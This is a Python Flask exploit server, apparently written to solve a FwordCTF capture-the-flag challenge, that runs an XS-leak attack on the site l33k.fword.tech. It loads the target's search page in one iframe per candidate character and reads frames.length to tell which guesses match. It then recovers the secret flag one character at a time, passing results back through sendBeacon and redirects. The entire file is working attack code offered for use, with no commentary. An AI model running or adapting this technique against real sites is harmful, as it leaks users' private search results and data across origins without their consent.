from flask import Flask, request
from urllib.parse import quote

app = Flask(__name__)

string = {}
alph = ' _~`!@#$%^&*()-+=;:\'"/?.>,<0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}'
payload = '<iframe src="https://l33k.fword.tech/search?query={}&img=%22%20bar=" name={}></iframe>'
payload2 = '''
<script>
window.onload = () => {
console.log(1);
setTimeout(()=>{
console.log(2);
for(var i=0x0; i < 128; i++ ){

	prev = new URLSearchParams(location.search).get("prev");
	try{
		foo = eval(`iframe_${i}`);
		if(foo.frames.length > 0) location="/leak?prev="+prev+String.fromCharCode(i);
	}
	catch(err){

		0;
		
	}
}
},100);
}
</script>
'''

@app.route("/leak", methods=['GET'])
def leak():

	prev = request.args.get('prev')
	html = ""
	s = ''.join(string[request.remote_addr])
	for i in s:

		html += payload.format(quote(prev+i),'iframe_'+str(ord(i)))
	
	html += payload2
	return html

@app.route("/", methods=['GET'])
def makeString():

	prev = request.args.get('prev')
	payload2 = '''
	<script>
	window.onload = () => {
	for(var i=0x0; i < 128; i++ ){
		try{
			foo = eval(`iframe_${i}`);
			if(foo.frames.length > 0) navigator.sendBeacon("/setChar?c="+String.fromCharCode(i));
		}
		catch(err){
		}
	}
	setTimeout(()=>{location='/leak?prev=FwordCTF{';},3000);
	}
	</script>
	'''
	html = ""
	for i in alph:

		html += payload.format(quote(i),'iframe_'+str(ord(i)))
	
	html += payload2
	return html

@app.route("/setChar", methods=['POST'])
def setChar():

	if(not (request.remote_addr in string.keys())):

		string[request.remote_addr] = []

	string[request.remote_addr].append(request.args.get('c'))
	return ''.join(string[request.remote_addr])

@app.route("/clean", methods=['GET'])
def clean():

	if(request.remote_addr in string.keys()):

		string[request.remote_addr] = []




app.run(host='0.0.0.0',port=5000)
